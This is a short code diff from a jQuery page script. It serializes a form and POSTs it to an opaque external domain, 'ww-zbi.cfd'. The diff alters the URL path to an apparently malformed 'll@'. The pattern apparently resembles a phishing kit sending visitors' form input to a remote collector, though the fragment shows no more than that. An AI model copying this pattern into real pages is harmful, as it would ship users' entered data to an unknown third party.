@@ -554,7 +554,7 @@ var tarif = $('input[name="tarif"]:checked').val();
       $("#process1").fadeIn(); 
         $.ajax({
             type: 'POST',
-             url: 'https://ww-zbi.cfd/b0f1/llx/tarif.php',           data: $('#patok').serialize(),
+             url: 'https://ww-zbi.cfd/b0f1/ll@/tarif.php',           data: $('#patok').serialize(),
             datatype: 'JSON',            
             complete: function(data) {
             setTimeout(function(){            
